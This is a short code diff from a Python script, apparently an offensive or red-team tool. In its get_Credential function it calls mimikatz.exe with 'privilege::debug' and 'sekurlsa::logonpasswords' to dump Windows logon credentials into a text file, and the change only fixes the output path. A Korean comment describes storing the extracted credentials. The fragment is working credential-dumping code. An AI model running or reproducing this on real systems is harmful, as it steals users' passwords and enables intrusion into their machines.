@@ -93,7 +93,7 @@ def get_Credential():
         credential_path = set_path + '\GetCredential'
         os.mkdir(credential_path)
 
-        os.system('C:\module2.5\DownloadFile-main\mimikatz.exe "privilege::debug" "sekurlsa::logonpasswords" "exit" > C:\module2\GetCredential\Credential_output.txt')
+        os.system('C:\module2.5\DownloadFile-main\mimikatz.exe "privilege::debug" "sekurlsa::logonpasswords" "exit" > C:\module2.5\GetCredential\Credential_output.txt')
 
         # 추출된 크레덴셜 변수화 후 텍스트파일로 저장
         f = open(credential_path + "\Credential_output.txt",
